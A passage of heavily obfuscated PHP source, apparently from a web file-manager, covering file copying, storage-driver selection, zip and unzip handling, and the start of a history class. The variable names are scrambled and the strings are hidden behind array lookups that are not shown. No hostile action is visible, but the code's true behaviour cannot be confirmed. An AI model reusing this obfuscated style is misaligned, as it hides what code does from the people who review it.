$»ïé¸ø¿[770]) { return !0; } if ($“¡¨“×— == $»ïé¸ø¿[106]) { return !0; } if ($çûŞ°¡Æ->pathDriver == $½í· ùê->pathDriver) { return !0; } return !1; } public static function copyUpdate($œìü‰ş©, $€Ñõ²íÍ) { $å€İ˜¸ë =& $_SERVER[ï»»·÷á]; if (!IO::exist($œìü‰ş©)) { return !1; } if (!IO::exist($€Ñõ²íÍ)) { IO::mkdir($€Ñõ²íÍ); } $²æøÑ‰” = array_to_keyvalue(self::listAllSimple($œìü‰ş©), $å€İ˜¸ë[84]); $Æ÷¥Ë„Æ = array_to_keyvalue(self::listAllSimple($€Ñõ²íÍ), $å€İ˜¸ë[84]); $Âë´§Â = array(); $¶ÔšûÅÔ = array(); foreach ($²æøÑ‰” as $Û‘Ø› => $ïÅÏÛ³´) { if (isset($Æ÷¥Ë„Æ[$Û‘Ø›])) { if ($ïÅÏÛ³´[$å€İ˜¸ë[75]] == 1) { continue; } if ($Æ÷¥Ë„Æ[$Û‘Ø›][$å€İ˜¸ë[76]] == $ïÅÏÛ³´[$å€İ˜¸ë[76]]) { continue; } } if ($ïÅÏÛ³´[$å€İ˜¸ë[75]] == 1) { $¶ÔšûÅÔ[] = $€Ñõ²íÍ . $å€İ˜¸ë[8] . trim($Û‘Ø›, $å€İ˜¸ë[8]); continue; } $·ÒòÈÕº = strstr(trim($Û‘Ø›, $å€İ˜¸ë[8]), $å€İ˜¸ë[8]) ? get_path_father($Û‘Ø›) : $å€İ˜¸ë[12]; $Âë´§Â[] = array($å€İ˜¸ë[1170] => $ïÅÏÛ³´[$å€İ˜¸ë[86]], $å€İ˜¸ë[1171] => rtrim($€Ñõ²íÍ, $å€İ˜¸ë[8]) . $å€İ˜¸ë[8] . $·ÒòÈÕº, $å€İ˜¸ë[1172] => $ïÅÏÛ³´); } $úóùÀÖı = array($å€İ˜¸ë[200] => $Âë´§Â, $å€İ˜¸ë[75] => $¶ÔšûÅÔ); Hook::trigger($å€İ˜¸ë[1173], $œìü‰ş©, $€Ñõ²íÍ, $úóùÀÖı); foreach ($¶ÔšûÅÔ as $ïÅÏÛ³´) { IO::mkdir($ïÅÏÛ³´); } foreach ($Âë´§Â as $ïÅÏÛ³´) { IO::copy($ïÅÏÛ³´[$å€İ˜¸ë[1170]], $ïÅÏÛ³´[$å€İ˜¸ë[1171]], REPEAT_REPLACE); } } public static function fileSubstr($‚…ÌûÆï, $ò‚ÕĞÛ•, $ã×ÂÀ–‹ = false) { $Ÿ­×÷èÙ =& $_SERVER[ï»»·÷á]; $ì§ÏßÌ = self::driverMake($‚…ÌûÆï); $ÁÜåˆï¡ = $ì§ÏßÌ->size($‚…ÌûÆï); $‚´ôµ = $ò‚ÕĞÛ•; $Ú«Å¼Æ¨ = $ã×ÂÀ–‹; if ($ò‚ÕĞÛ• < 0) { $ò‚ÕĞÛ• = $ÁÜåˆï¡ + $ò‚ÕĞÛ•; } if ($ã×ÂÀ–‹ === !1) { $ã×ÂÀ–‹ = $ÁÜåˆï¡ - $ò‚ÕĞÛ•; } if ($ò‚ÕĞÛ• + $ã×ÂÀ–‹ > $ÁÜåˆï¡) { $ã×ÂÀ–‹ = $ÁÜåˆï¡ - $ò‚ÕĞÛ•; } if (!$ÁÜåˆï¡ && $ì§ÏßÌ->getType() == $Ÿ­×÷èÙ[106] && !$ì§ÏßÌ->exist($‚…ÌûÆï)) { $ ×µƒô = get_path_this($‚…ÌûÆï); $¢Û”¬î = parse_url_query($ ×µƒô); if (is_array($¢Û”¬î) && isset($¢Û”¬î[$Ÿ­×÷èÙ[32]])) { $ ×µƒô = urldecode($¢Û”¬î[$Ÿ­×÷èÙ[32]]); } throw new Exception($Ÿ­×÷èÙ[1174] . LNG($Ÿ­×÷èÙ[1175]) . $Ÿ­×÷èÙ[976] . clear_html($ ×µƒô) . $Ÿ­×÷èÙ[12]); } if ($ã×ÂÀ–‹ <= 0) { return $Ÿ­×÷èÙ[12]; } if ($ò‚ÕĞÛ• < 0 || $ò‚ÕĞÛ• >= $ÁÜåˆï¡ || $ã×ÂÀ–‹ > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\x65\122\x65\x61\144\x20\145\162\x72\x6f\x72\41\x20\x73\x74\x61\x72\x74\x3d{$ò‚ÕĞÛ•}\x3b\x6c\145\156\147\x74\150\x3d{$ã×ÂÀ–‹}\73\40\163\x69\x7a\145\75{$ÁÜåˆï¡}\73"); } $¿èİØ¦ = $ì§ÏßÌ->fileSubstr($‚…ÌûÆï, $ò‚ÕĞÛ•, $ã×ÂÀ–‹); if (!$¿èİØ¦ && $ã×ÂÀ–‹ && isset($GLOBALS[$Ÿ­×÷èÙ[1176]])) { throw new Exception($GLOBALS[$Ÿ­×÷èÙ[1176]][$Ÿ­×÷èÙ[1177]]); } return $¿èİØ¦; } private static function driverMake(&$™“ö»ùè) { $—òÀüÁ =& $_SERVER[ï»»·÷á]; $èÊ€î“¦ = KodIO::parse($™“ö»ùè); if (!self::$driverListSystem) { $â¶ò”£ = Model($—òÀüÁ[780])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($â¶ò”£, $—òÀüÁ[399]); } if ($èÊ€î“¦[$—òÀüÁ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$èÊ€î“¦[$—òÀüÁ[399]]]) { return !1; } $™“ö»ùè = $èÊ€î“¦[$—òÀüÁ[1178]]; $ŸĞªì = self::driverGet($èÊ€î“¦, $™“ö»ùè); return $ŸĞªì; } private static function driverGet($»ï¼Ä„ê, &$ÍÚçíª) { $İ¸€à¨á =& $_SERVER[ï»»·÷á]; $í•²ÄÀí = $»ï¼Ä„ê[$İ¸€à¨á[1179]]; $Âš÷ÆÂµ = $»ï¼Ä„ê[$İ¸€à¨á[399]]; switch ($»ï¼Ä„ê[$İ¸€à¨á[33]]) { case KodIO::KOD_IO: $èƒÚŒÒ™ = self::$driverListSystem[$Âš÷ÆÂµ]; break; case KodIO::KOD_SOURCE: $ÍÚçíª = $Âš÷ÆÂµ . $ÍÚçíª; $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1181], $İ¸€à¨á[6] => $»ï¼Ä„ê); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¹ŸÒ¸˜‘ = $GLOBALS[$İ¸€à¨á[1182]]; self::$driverListUser = array_to_keyvalue($¹ŸÒ¸˜‘, $İ¸€à¨á[399]); } $èƒÚŒÒ™ = self::$driverListUser[$Âš÷ÆÂµ]; break; case KodIO::KOD_SHARE_LINK: $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1183], $İ¸€à¨á[6] => $»ï¼Ä„ê); $³ôæ…ğ = Action($İ¸€à¨á[1184])->sharePathInfo($»ï¼Ä„ê[$İ¸€à¨á[84]]); $ÍÚçíª = $³ôæ…ğ[$İ¸€à¨á[411]]; if (!$³ôæ…ğ[$İ¸€à¨á[411]]) { $“®ÕÚâ™ = Model($İ¸€à¨á[601])->getInfo($³ôæ…ğ[$İ¸€à¨á[602]]); $ÍÚçíª = KodIO::clear($“®ÕÚâ™[$İ¸€à¨á[1185]] . $»ï¼Ä„ê[$İ¸€à¨á[1178]]); $»ï¼Ä„ê[$İ¸€à¨á[495]] = $“®ÕÚâ™; $»ï¼Ä„ê[$İ¸€à¨á[1161]] = $ÍÚçíª; $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1186], $İ¸€à¨á[6] => $»ï¼Ä„ê); } break; case KodIO::KOD_SHARE_ITEM: $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1187], $İ¸€à¨á[6] => $»ï¼Ä„ê); $“®ÕÚâ™ = Model($İ¸€à¨á[601])->getInfo($»ï¼Ä„ê[$İ¸€à¨á[399]]); if ($“®ÕÚâ™[$İ¸€à¨á[411]] == $İ¸€à¨á[198]) { $ÍÚçíª = KodIO::clear($“®ÕÚâ™[$İ¸€à¨á[1185]] . $»ï¼Ä„ê[$İ¸€à¨á[1178]]); $»ï¼Ä„ê[$İ¸€à¨á[495]] = $“®ÕÚâ™; $»ï¼Ä„ê[$İ¸€à¨á[1161]] = $ÍÚçíª; $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1188], $İ¸€à¨á[6] => $»ï¼Ä„ê); } else { if (!$ÍÚçíª) { $ÍÚçíª = $“®ÕÚâ™[$İ¸€à¨á[411]]; } } break; default: $ÍÚçíª = $»ï¼Ä„ê[$İ¸€à¨á[84]]; $èƒÚŒÒ™ = array($İ¸€à¨á[1180] => $İ¸€à¨á[1189]); break; } $‘ÂŠöö¸ = $»ï¼Ä„ê[$İ¸€à¨á[84]]; if (!isset(self::$driverCache[$‘ÂŠöö¸])) { $Åñó˜ªÉ = strtolower($èƒÚŒÒ™[$İ¸€à¨á[95]]); $·¢…²ü = $GLOBALS[$İ¸€à¨á[6]][$İ¸€à¨á[89]][$İ¸€à¨á[839]]; $«÷ù’şÏ = $İ¸€à¨á[74] . (isset($·¢…²ü[$Åñó˜ªÉ]) ? $·¢…²ü[$Åñó˜ªÉ] : ucfirst($Åñó˜ªÉ)); if (!class_exists($«÷ù’şÏ)) { show_json("{$«÷ù’şÏ}\x20\x6e\157\164\x20\145\170\151\163\x74\163\41", !1); } $‚å×İó = isset($èƒÚŒÒ™[$İ¸€à¨á[6]]) ? $èƒÚŒÒ™[$İ¸€à¨á[6]] : !1; self::$driverCache[$‘ÂŠöö¸] = new $«÷ù’şÏ($‚å×İó); } $É³Ö°Æ = self::$driverCache[$‘ÂŠöö¸]; $É³Ö°Æ->pathDriver = $í•²ÄÀí; $É³Ö°Æ->pathBase = $İ¸€à¨á[12]; if (isset($èƒÚŒÒ™[$İ¸€à¨á[6]][$İ¸€à¨á[1190]])) { $É³Ö°Æ->pathBase = rtrim($èƒÚŒÒ™[$İ¸€à¨á[6]][$İ¸€à¨á[1190]], $İ¸€à¨á[8]) . $İ¸€à¨á[8]; $ÍÚçíª = $É³Ö°Æ->pathBase . ltrim($ÍÚçíª, $İ¸€à¨á[8]); } $ÍÚçíª = $É³Ö°Æ->getPath($ÍÚçíª); if (isset($»ï¼Ä„ê[$İ¸€à¨á[1161]])) { $ÍÚçíª = $»ï¼Ä„ê[$İ¸€à¨á[1161]]; } $É³Ö°Æ->path = $ÍÚçíª; return $É³Ö°Æ; } public static function errorTips($¦ÙÓÚŸ‡ = false) { $’°Î†Ó— =& $_SERVER[ï»»·÷á]; static $±şÀ©Ï = array(); $¦£ôÃ˜Ì = 1000; if ($¦ÙÓÚŸ‡ === -1) { return $±şÀ©Ï ? $±şÀ©Ï[count($±şÀ©Ï) - 1] : $’°Î†Ó—[12]; } if ($¦ÙÓÚŸ‡ === !1) { return implode($’°Î†Ó—[231], $±şÀ©Ï); } if (count($±şÀ©Ï) >= $¦£ôÃ˜Ì) { $±şÀ©Ï = array_slice($±şÀ©Ï, $¦£ôÃ˜Ì * 0.5, $¦£ôÃ˜Ì); } $±şÀ©Ï[] = $¦ÙÓÚŸ‡; write_log($’°Î†Ó—[162] . ACTION . $’°Î†Ó—[1191] . $¦ÙÓÚŸ‡, $’°Î†Ó—[1192]); } public static function getLastError($¡ŒßÉïŠ = '') { $ÆÍšã¦ª = self::errorTips(-1); return $ÆÍšã¦ª ? $ÆÍšã¦ª : $¡ŒßÉïŠ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Âé‡†; if ($Âé‡†) { return $Âé‡†; } $‚ÄÜš”Ù = IO::init($_SERVER[ï»»·÷á][8]); return $‚ÄÜš”Ù; } private static function iconvSystem($ñòùŠüó) { return self::local()->iconvSystem($ñòùŠüó); } private static function iconvApp($úƒñƒÇÏ) { return self::local()->iconvApp($úƒñƒÇÏ); } public static function zipFolder($ë¸ÅÉè›, $¡¶„ı©… = "\x7a\151\x70", $‡Ñô‰Êæ = '', $ß·ñŒ÷† = REPEAT_RENAME) { $­ Ñ¡Åª =& $_SERVER[ï»»·÷á]; $ÊïÑ÷ë = IO::listPath($ë¸ÅÉè›); if (!$ÊïÑ÷ë) { return !1; } $ÊïÑ÷ë = array_merge($ÊïÑ÷ë[$­ Ñ¡Åª[82]], $ÊïÑ÷ë[$­ Ñ¡Åª[83]]); return self::zip($ÊïÑ÷ë, $¡¶„ı©…, $‡Ñô‰Êæ, $ß·ñŒ÷†); } public static function zip($çß¼Âª, $àë«ñ¾Á = "\x7a\151\x70", $şèö¥Ã = '', $Ô…è®² = REPEAT_RENAME) { $²«§ğÑì =& $_SERVER[ï»»·÷á]; if (is_string($çß¼Âª) && $çß¼Âª) { $çß¼Âª = array(array($²«§ğÑì[84] => $çß¼Âª)); } $œçğæ•ş = self::init($çß¼Âª[0][$²«§ğÑì[84]]); $¦Â¾ø û = self::info($çß¼Âª[0][$²«§ğÑì[84]]); $ƒÒ¸Ëæã = $²«§ğÑì[12]; $‰˜åî…× = $²«§ğÑì[12]; $ûÄÕèéĞ = $²«§ğÑì[12]; if ($şèö¥Ã && substr($şèö¥Ã, -1, 1) != $²«§ğÑì[8]) { $‰˜åî…× = get_path_father($şèö¥Ã); $ûÄÕèéĞ = get_path_this($şèö¥Ã); } else { $‰˜åî…× = self::pathFather($¦Â¾ø û[$²«§ğÑì[84]]); $ûÄÕèéĞ = $¦Â¾ø û[$²«§ğÑì[32]] . $²«§ğÑì[10] . $àë«ñ¾Á; if (count($çß¼Âª) > 1) { $ÀÀ‚Îº– = IO::info($‰˜åî…×); $ûÄÕèéĞ = $ÀÀ‚Îº–[$²«§ğÑì[32]] . $²«§ğÑì[10] . $àë«ñ¾Á; } if ($şèö¥Ã) { $‰˜åî…× = $şèö¥Ã; } } if ($œçğæ•ş->getType() == $²«§ğÑì[106]) { $ü¸»×É÷ = self::init($‰˜åî…×); $ÓŸáÜØ = $ü¸»×É÷->getType() == $²«§ğÑì[106] ? $‰˜åî…× : get_path_father($œçğæ•ş->path); $ÓŸáÜØ = rtrim($ÓŸáÜØ, $²«§ğÑì[8]) . $²«§ğÑì[8]; mk_dir($ÓŸáÜØ); } else { $ƒÒ¸Ëæã = TEMP_FILES . $²«§ğÑì[1193] . time() . rand_string(8) . $²«§ğÑì[8]; mk_dir($ƒÒ¸Ëæã); file_put_contents($ƒÒ¸Ëæã . $²«§ğÑì[1194], $²«§ğÑì[12]); $ÓŸáÜØ = $ƒÒ¸Ëæã; } $»Âıî¬Ó = IO::info($ÓŸáÜØ); if (!$»Âıî¬Ó || !$»Âıî¬Ó[$²«§ğÑì[203]]) { show_json(LNG($²«§ğÑì[1195]), !1); } $ÄéÍÇÃû = self::zipFileList($çß¼Âª, $ƒÒ¸Ëæã); foreach ($ÄéÍÇÃû as $¶ç²Û²¾ => $É‡Üóô•) { $ÄéÍÇÃû[$¶ç²Û²¾] = self::iconvSystem($É‡Üóô•); } $ŠúÄµ· = get_filename_auto($ÓŸáÜØ . $ûÄÕèéĞ, $²«§ğÑì[12], $Ô…è®²); KodArchive::create(self::iconvSystem($ŠúÄµ·), $ÄéÍÇÃû); if (!IO::exist($ŠúÄµ·)) { if ($ƒÒ¸Ëæã) { del_dir($ƒÒ¸Ëæã); } show_json(LNG($²«§ğÑì[1196]), !1); } if (!$ƒÒ¸Ëæã) { return $ŠúÄµ·; } $±“…±û… = self::move($ŠúÄµ·, $‰˜åî…×, $Ô…è®²); if ($ƒÒ¸Ëæã) { del_dir($ƒÒ¸Ëæã); } if (!$ŠúÄµ·) { show_json(LNG($²«§ğÑì[1196]), !1); } return $±“…±û…; } public static function unzip($ï‚ÚáûÅ, $ÁÀŠØÄ, $Çãí³«– = "\x2d\x31", $Å—Š¢ğî = "\162\145\160\x6c\x61\x63\145") { $ÉòœÏÙ· =& $_SERVER[ï»»·÷á]; $£¨ı‹•Ò = parent::info($ï‚ÚáûÅ); if (!$£¨ı‹•Ò) { show_json(LNG($ÉòœÏÙ·[1197]), !1); } $³ë’×ÎÓ = IO::infoFull($ÁÀŠØÄ); if (!$³ë’×ÎÓ) { $ÁÀŠØÄ = IO::mkdir($ÁÀŠØÄ); } if (isset($³ë’×ÎÓ[$ÉòœÏÙ·[411]]) && trim($³ë’×ÎÓ[$ÉòœÏÙ·[84]], $ÉòœÏÙ·[8]) != trim($ÁÀŠØÄ, $ÉòœÏÙ·[8])) { $¥âã”µá = KodIO::make($³ë’×ÎÓ[$ÉòœÏÙ·[441]]); $·õÚ†ÃÁ = IO::fileNameAuto($¥âã”µá, $³ë’×ÎÓ[$ÉòœÏÙ·[32]], REPEAT_RENAME_FOLDER, !0); $ÁÀŠØÄ = IO::mkdir($¥âã”µá . $·õÚ†ÃÁ); } $Çãí³«– = $Çãí³«– && $Çãí³«– != $ÉòœÏÙ·[1198] ? @json_decode($Çãí³«–, !0) : -1; $ßúïÄÂ  = self::unzipPart($ï‚ÚáûÅ, $Çãí³«–); if (!$ßúïÄÂ  || !IO::exist($ßúïÄÂ [$ÉòœÏÙ·[200]])) { show_json(LNG($ÉòœÏÙ·[105]), !1); } $ñõç‹–° = $ßúïÄÂ [$ÉòœÏÙ·[1199]][count($ßúïÄÂ [$ÉòœÏÙ·[1199]]) - 1]; if ($ñõç‹–°[$ÉòœÏÙ·[1200]] == -1 || substr($ñõç‹–°[$ÉòœÏÙ·[32]], -1, 1) == $ÉòœÏÙ·[8]) { $û÷‹€Ü² = $ßúïÄÂ [$ÉòœÏÙ·[1201]] . rand_string(10) . $ÉòœÏÙ·[8]; mk_dir($û÷‹€Ü²); $¢œÌ°ÉË = count($ßúïÄÂ [$ÉòœÏÙ·[1199]]) == 1 ? IO::ext($ï‚ÚáûÅ) : get_path_ext($ßúïÄÂ [$ÉòœÏÙ·[200]]); $Ä’ÑúŞõ = KodArchive::extract(self::iconvSystem($ßúïÄÂ [$ÉòœÏÙ·[200]]), $û÷‹€Ü², $ñõç‹–°[$ÉòœÏÙ·[1200]], $·õÚ†ÃÁ, $¢œÌ°ÉË); self::unzipErrorCheck($Ä’ÑúŞõ, array($ÉòœÏÙ·[1202], $ï‚ÚáûÅ, $¢œÌ°ÉË, $ÁÀŠØÄ, $ßúïÄÂ )); Hook::trigger($ÉòœÏÙ·[1203], $û÷‹€Ü²); recursion_dir($û÷‹€Ü², $ÚÏ—°íŠ, $îíÎ, 0); $¦‚»¡Ç = array_merge($ÚÏ—°íŠ, $îíÎ); $Ã±ßĞÚ = array(); foreach ($¦‚»¡Ç as $ÃÅ¡³ä€) { $¬¡ş”ß = IO::move(self::iconvApp($ÃÅ¡³ä€), $ÁÀŠØÄ, $Å—Š¢ğî); if ($¬¡ş”ß) { $Ã±ßĞÚ[] = $¬¡ş”ß; } } del_dir($û÷‹€Ü²); } else { $¬¡ş”ß = IO::move($ßúïÄÂ [$ÉòœÏÙ·[200]], $ÁÀŠØÄ, $Å—Š¢ğî, get_path_this($ñõç‹–°[$ÉòœÏÙ·[32]])); if ($¬¡ş”ß) { $Ã±ßĞÚ[] = $¬¡ş”ß; } } return $Ã±ßĞÚ ? $Ã±ßĞÚ : !1; } public static function unzipList($Ùî‹…úÊ) { $‹¶¾©ú =& $_SERVER[ï»»·÷á]; $œ†ú¨ù = isset($Ùî‹…úÊ[$‹¶¾©ú[1204]]) ? $Ùî‹…úÊ[$‹¶¾©ú[1204]] : !1; $İŒíì¸ = isset($Ùî‹…úÊ[$‹¶¾©ú[1200]]) ? @json_decode($Ùî‹…úÊ[$‹¶¾©ú[1200]], !0) : -1; $ô”·ÖŸ  = self::unzipPart($Ùî‹…úÊ[$‹¶¾©ú[84]], $İŒíì¸); if (!$ô”·ÖŸ  || !IO::exist($ô”·ÖŸ [$‹¶¾©ú[200]])) { show_json(LNG($‹¶¾©ú[105]), !1); } $·®Ç‹† = $ô”·ÖŸ [$‹¶¾©ú[1199]][count($ô”·ÖŸ [$‹¶¾©ú[1199]]) - 1]; $Á‰¶¡¿í = in_array(IO::ext($ô”·ÖŸ [$‹¶¾©ú[200]]), array($‹¶¾©ú[313], $‹¶¾©ú[1205], $‹¶¾©ú[1206], $‹¶¾©ú[1207], $‹¶¾©ú[1208], $‹¶¾©ú[1209])); if (!$œ†ú¨ù && ($·®Ç‹†[$‹¶¾©ú[1200]] == -1 || $Á‰¶¡¿í)) { $–Ë©¯™˜ = $ô”·ÖŸ [$‹¶¾©ú[1201]] . get_path_this($ô”·ÖŸ [$‹¶¾©ú[200]]) . $‹¶¾©ú[1210]; if (!IO::exist($–Ë©¯™˜)) { $¿ĞÀÅ‘® = $·®Ç‹†[$‹¶¾©ú[1200]] == -1 ? get_path_ext(IO::pathThis($Ùî‹…úÊ[$‹¶¾©ú[84]])) : get_path_ext($ô”·ÖŸ [$‹¶¾©ú[200]]); $ËÄ¬Â¿Ä = KodArchive::listContent(self::iconvSystem($ô”·ÖŸ [$‹¶¾©ú[200]]), !0, $¿ĞÀÅ‘®); self::unzipErrorCheck($ËÄ¬Â¿Ä, array($‹¶¾©ú[1211], $Ùî‹…úÊ, $ô”·ÖŸ )); @file_put_contents($–Ë©¯™˜, json_encode($ËÄ¬Â¿Ä[$‹¶¾©ú[1212]])); } return @json_decode(IO::getContent($–Ë©¯™˜), !0); } IO::fileOut($ô”·ÖŸ [$‹¶¾©ú[200]], $œ†ú¨ù, get_path_this($·®Ç‹†[$‹¶¾©ú[32]])); die; } private static function zipFileList($§¯ğ—ß±, $Û¨Â¾ÁÓ = false) { $Ë†‘À =& $_SERVER[ï»»·÷á]; $Ø¨†¬Ğ‰ = array(); foreach ($§¯ğ—ß± as $Ë¬ßŠÓË) { $Ç¿œûƒ = $Ë¬ßŠÓË[$Ë†‘À[84]]; if ($Û¨Â¾ÁÓ) { $Ç¿œûƒ = self::copy($Ë¬ßŠÓË[$Ë†‘À[84]], $Û¨Â¾ÁÓ, $Ë†‘À[831]); } else { $äÅö¡ = self::init($Ë¬ßŠÓË[$Ë†‘À[84]]); if ($äÅö¡->getType() == $Ë†‘À[106]) { $Ç¿œûƒ = $äÅö¡->path; } } if ($Ç¿œûƒ && self::local()->exist($Ç¿œûƒ)) { $Ø¨†¬Ğ‰[$Ë¬ßŠÓË[$Ë†‘À[84]]] = $Ç¿œûƒ; } } if (!empty($Ø¨†¬Ğ‰)) { return array_values($Ø¨†¬Ğ‰); } show_json(LNG($Ë†‘À[1175]), !1); } private static function localFilePath($˜ÖÆï–) { $º¤²Ğ¸´ =& $_SERVER[ï»»·÷á]; $³¿¸¤³â = KodIO::parse($˜ÖÆï–); if ($³¿¸¤³â[$º¤²Ğ¸´[33]] == KodIO::KOD_SOURCE) { $‚ôğÁÊÔ = Model($º¤²Ğ¸´[838])->fileInfoGet(KodIO::sourceID($˜ÖÆï–)); if (!$‚ôğÁÊÔ[$º¤²Ğ¸´[84]]) { show_json($º¤²Ğ¸´[1213], !1); } $˜ÖÆï– = $‚ôğÁÊÔ[$º¤²Ğ¸´[84]]; } $÷œùÁÙ = self::init($˜ÖÆï–); if ($÷œùÁÙ->pathParse[$º¤²Ğ¸´[1161]]) { $˜ÖÆï– = $÷œùÁÙ->pathParse[$º¤²Ğ¸´[1161]]; $÷œùÁÙ = self::init($˜ÖÆï–); } $®÷º‹Â = $÷œùÁÙ->getType(); if ($®÷º‹Â == $º¤²Ğ¸´[106] || $®÷º‹Â == $º¤²Ğ¸´[1214]) { if (!$÷œùÁÙ->exist($÷œùÁÙ->path)) { show_json(LNG($º¤²Ğ¸´[105]), !1); } return $÷œùÁÙ->path; } return !1; } public static function unzipPart($åºâú¤, $“»Ü«ôÉ = -1) { $ğ«èöé¢ =& $_SERVER[ï»»·÷á]; $¶Ë—™±‡ = IO::pathThis($åºâú¤); if (!$“»Ü«ôÉ || $“»Ü«ôÉ == -1) { $Ç‘Ò†Ë = array(array($ğ«èöé¢[32] => $¶Ë—™±‡, $ğ«èöé¢[1200] => -1)); $Ç‘Ò†Ë[0][$ğ«èöé¢[1215]] = $Ç‘Ò†Ë[0][$ğ«èöé¢[32]]; } else { if (is_array($“»Ü«ôÉ)) { $Ç‘Ò†Ë = $“»Ü«ôÉ; $íİú¬µ = count($Ç‘Ò†Ë) - 1; for ($«á©íÌò = 0; $«á©íÌò <= $íİú¬µ; $«á©íÌò++) { $ç¤ÊîäÙ = $Ç‘Ò†Ë[$«á©íÌò]; $Ÿ×éà‰ª = get_path_this($ç¤ÊîäÙ[$ğ«èöé¢[32]]) . (checkExtSafe($ç¤ÊîäÙ[$ğ«èöé¢[32]]) ? $ğ«èöé¢[12] : $ğ«èöé¢[1216]); $Ç‘Ò†Ë[$«á©íÌò][$ğ«èöé¢[1215]] = $ğ«èöé¢[1217] . intval($ç¤ÊîäÙ[$ğ«èöé¢[1200]]) . $ğ«èöé¢[386] . $Ÿ×éà‰ª; if ($«á©íÌò == 0) { continue; } $Ç‘Ò†Ë[$«á©íÌò][$ğ«èöé¢[1215]] = $Ç‘Ò†Ë[$«á©íÌò - 1][$ğ«èöé¢[1215]] . $ğ«èöé¢[1218] . $Ç‘Ò†Ë[$«á©íÌò][$ğ«èöé¢[1215]]; } } } if (!is_array($Ç‘Ò†Ë) || count($Ç‘Ò†Ë) == 0) { return !1; } $ØïÜ»¯– = $Ç‘Ò†Ë[count($Ç‘Ò†Ë) - 1]; if (!IO::exist($åºâú¤)) { return !1; } $âÆ˜Ø¾ë = TEMP_FILES . $ğ«èöé¢[1219] . kodIO::hashPathSafe($åºâú¤) . $ğ«èöé¢[8]; $ëñ¿« = $âÆ˜Ø¾ë . $ØïÜ»¯–[$ğ«èöé¢[1215]]; mk_dir($âÆ˜Ø¾ë); file_put_contents(TEMP_FILES . $ğ«èöé¢[1194], $ğ«èöé¢[12]); if (IO::exist($ëñ¿«)) { return array($ğ«èöé¢[200] => $ëñ¿«, $ğ«èöé¢[1199] => $Ç‘Ò†Ë, $ğ«èöé¢[1201] => $âÆ˜Ø¾ë); } $Š‘¥²—ö = self::localFilePath($åºâú¤); if (!$Š‘¥²—ö) { $Š‘¥²—ö = $âÆ˜Ø¾ë . $ğ«èöé¢[1220]; if (!IO::exist($Š‘¥²—ö)) { self::copy($åºâú¤, $âÆ˜Ø¾ë, !1, get_path_this($Š‘¥²—ö)); } } if (!$Š‘¥²—ö || !IO::exist($Š‘¥²—ö)) { return !1; } if ($ØïÜ»¯–[$ğ«èöé¢[1200]] == -1) { return array($ğ«èöé¢[200] => $Š‘¥²—ö, $ğ«èöé¢[1199] => $Ç‘Ò†Ë, $ğ«èöé¢[1201] => $âÆ˜Ø¾ë); } $œÃ“Î = $Š‘¥²—ö; foreach ($Ç‘Ò†Ë as $«á©íÌò => $ç¤ÊîäÙ) { if (!$ç¤ÊîäÙ || $ç¤ÊîäÙ[$ğ«èöé¢[1200]] == $ğ«èöé¢[1198]) { break; } if (substr($ç¤ÊîäÙ[$ğ«èöé¢[32]], -1, 1) == $ğ«èöé¢[8]) { break; } $ï»¸ù®— = in_array(get_path_ext($ç¤ÊîäÙ[$ğ«èöé¢[1215]]), array($ğ«èöé¢[313], $ğ«èöé¢[1205], $ğ«èöé¢[1206], $ğ«èöé¢[1207], $ğ«èöé¢[1208], $ğ«èöé¢[1209])); $¢Ä‰éø± = $«á©íÌò == count($Ç‘Ò†Ë) - 1 && $ï»¸ù®—; $µ‹»Šå÷ = $âÆ˜Ø¾ë . $ç¤ÊîäÙ[$ğ«èöé¢[1215]]; $é›Æ“ä® = $âÆ˜Ø¾ë . get_path_this($ç¤ÊîäÙ[$ğ«èöé¢[32]]); if (IO::exist($µ‹»Šå÷)) { $œÃ“Î = $µ‹»Šå÷; continue; } $ÏöãÂÍó = $«á©íÌò == 0 ? get_path_ext($¶Ë—™±‡) : get_path_ext($œÃ“Î); $–µ—Œ­« = KodArchive::extract(self::iconvSystem($œÃ“Î), $âÆ˜Ø¾ë, $ç¤ÊîäÙ[$ğ«èöé¢[1200]], $İ¾Ã‰’µ, $ÏöãÂÍó); self::unzipErrorCheck($–µ—Œ­«, array($ğ«èöé¢[1221], $åºâú¤, $Ç‘Ò†Ë, $ç¤ÊîäÙ, $µ‹»Šå÷)); if (IO::exist($é›Æ“ä®)) { IO::rename($é›Æ“ä®, get_path_this($µ‹»Šå÷)); } $œÃ“Î = $µ‹»Šå÷; } $ëñ¿« = $œÃ“Î; return array($ğ«èöé¢[200] => $œÃ“Î, $ğ«èöé¢[1199] => $Ç‘Ò†Ë, $ğ«èöé¢[1201] => $âÆ˜Ø¾ë); } private static function unzipErrorCheck($¨¼”Àò, $ßÚ•úä± = false) { $ŠÂğµªö =& $_SERVER[ï»»·÷á]; if ($¨¼”Àò[$ŠÂğµªö[1222]]) { return !0; } write_log(array($ŠÂğµªö[1223], $¨¼”Àò, $ßÚ•úä±), $ŠÂğµªö[1224]); show_json($ŠÂğµªö[1225] . json_encode($¨¼”Àò[$ŠÂğµªö[1212]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $©ÇËÒÅâ =& $_SERVER[ï»»·÷á]; $¶Ş›Û±î = $GLOBALS[$©ÇËÒÅâ[6]][$©ÇËÒÅâ[89]]; if ($¶Ş›Û±î[$©ÇËÒÅâ[1226]] != 1) { return; } if ($¶Ş›Û±î[$©ÇËÒÅâ[1227]] <= 0) { return; } if (isset($_REQUEST[$©ÇËÒÅâ[1228]]) && $_REQUEST[$©ÇËÒÅâ[1228]] == $©ÇËÒÅâ[88]) { return; } Hook::bind($©ÇËÒÅâ[1229], $©ÇËÒÅâ[1230]); Hook::bind($©ÇËÒÅâ[1231], $©ÇËÒÅâ[1232]); Hook::bind($©ÇËÒÅâ[1233], $©ÇËÒÅâ[1234]); Hook::bind($©ÇËÒÅâ[1235], $©ÇËÒÅâ[1236]); Hook::bind($©ÇËÒÅâ[1237], 